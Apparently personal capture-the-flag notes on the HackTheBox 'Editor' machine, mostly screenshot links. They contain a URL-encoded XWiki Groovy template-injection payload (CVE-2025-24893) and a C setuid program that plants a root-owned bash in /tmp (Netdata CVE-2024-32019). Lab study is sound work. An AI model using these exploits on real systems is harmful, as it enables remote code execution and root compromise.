![[Pasted image 20260109225646.png]]


 writup- https://0xdf.gitlab.io/2025/12/06/htb-editor.html
 

![[Pasted image 20260109231134.png]]


![[Pasted image 20260109231941.png]]


![[Pasted image 20260109232010.png]]



## Shell as xwiki

### CVE-2025-24893 Background



![[Pasted image 20260109233958.png]]


![[Pasted image 20260109234553.png]]


✅ **SSTI is CONFIRMED!**


%7d%7d%7d%7b%7b%61%73%79%6e%63%20%61%73%79%6e%63%3d%66%61%6c%73%65%7d%7d%7b%7b%67%72%6f%6f%76%79%7d%7d%70%72%69%6e%74%6c%6e%28%22%69%64%22%2e%65%78%65%63%75%74%65%28%29%2e%74%65%78%74%29%7b%7b%2f%67%72%6f%6f%76%79%7d%7d%7b%7b%2f%61%73%79%6e%63%7d%7d


![[Pasted image 20260110001745.png]]


![[Pasted image 20260110001846.png]]


![[Pasted image 20260110012930.png]]


![[Pasted image 20260110012950.png]]



![[Pasted image 20260110012432.png]]


![[Pasted image 20260110012536.png]]


![[Pasted image 20260110012845.png]]


![[Pasted image 20260110012910.png]]



![[Pasted image 20260110013601.png]]


![[Pasted image 20260110013840.png]]


![[Pasted image 20260110014146.png]]


![[Pasted image 20260110014200.png]]


![[Pasted image 20260110014341.png]]


![[Pasted image 20260110014447.png]]



![[Pasted image 20260110014838.png]]


![[Pasted image 20260110021115.png]]


![[Pasted image 20260110021138.png]]


![[Pasted image 20260110021217.png]]


![[Pasted image 20260110021519.png]]


![[Pasted image 20260110021728.png]]


netdata 1.45.2 cve
 [CVE-2024-32019](https://nvd.nist.gov/vuln/detail/CVE-2024-32019)


![[Pasted image 20260110022216.png]]


```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 6777 /tmp/0xdf");
    return 0;
}

```


![[Pasted image 20260110022830.png]]


![[Pasted image 20260110022905.png]]


![[Pasted image 20260110023322.png]]


![[Pasted image 20260110023352.png]]
